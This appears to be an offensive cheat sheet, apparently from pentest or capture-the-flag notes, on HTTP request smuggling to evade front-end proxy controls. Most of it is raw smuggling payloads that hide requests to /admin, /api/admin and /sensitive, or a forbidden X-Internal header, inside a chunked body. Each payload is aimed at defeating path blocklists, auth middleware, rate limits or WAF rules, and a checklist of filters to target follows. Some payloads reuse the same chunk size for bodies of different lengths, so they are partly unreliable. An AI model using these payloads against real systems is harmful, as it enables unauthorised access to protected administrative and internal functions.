# Frontend bypass — getting past the proxy's filter

## The shape — the filter lives on the front-end only

A WAF, a path-blocklist, an auth-check, or a rate-limiter runs on the
FRONT-end — the back-end behind it is unfiltered. A smuggle puts the
blocked request behind a permitted one → the filter never sees it.

## The path-block bypass — `GET /admin` behind a path filter

```text
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

The front filters on `/admin` — the smuggle's `/admin` is inside the
chunked body — the filter sees only `POST /` → allowed → the back-end
runs `/admin`.

## The header-filter bypass — `X-Internal` blocked on the front

```text
GET / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: t
X-Internal: true
Content-Length: 15

x=1
0
```

The front strips/blocks `X-Internal` — the smuggle's `X-Internal` is
inside the chunk — the back-end sees it.

## The auth-check bypass — the proxy's auth layer

```text
POST /api/allowed HTTP/1.1
Authorization: Bearer lowpriv
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /api/admin HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

The front checks `Authorization` on `/api/allowed` — passes — the smuggle
reaches `/api/admin` which the front would have blocked but the back-end
doesn't re-check.

## The rate-limit bypass — N requests in one

```text
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /sensitive HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

The front counts ONE request (the outer POST) — the back-end sees TWO —
the rate-limit is per-front-request → unlimited smuggles.

## The WAF-signature bypass — the payload the WAF never parses

A SQLi/XSS payload inside the smuggle's body — the WAF sees only the
outer request's body — the smuggle's payload never hits the WAF's rules.

## The header-inheritance — the front's auth headers

```text
GET /admin HTTP/1.1
Host: t
```

smuggled inside a request that carried `Authorization` — the front may
add `X-Forwarded-For: <your-ip>` — the smuggle inherits it — the back-end
sees the front's IP as the source.

## The common front-filters — the checklist

- path-blocklist — `/admin`, `/internal`, `/flag`
- header-blocklist — `X-Internal`, `X-Admin`, `Debug`
- method-blocklist — `TRACE`, `PUT`, `DELETE`
- auth-middleware — `Authorization`/`Cookie` checked on the front
- rate-limit — per-request on the front
- body-inspection — WAF on the body text

## The readback — the filtered-route's output

The smuggle's response goes to the NEXT request — `response-poisoning.md`
— the self-poison readback.

## The evidence — the internal-route response

The smuggle's `GET /admin` returns the admin page — the admin content
in the NEXT response — verbatim excerpt.
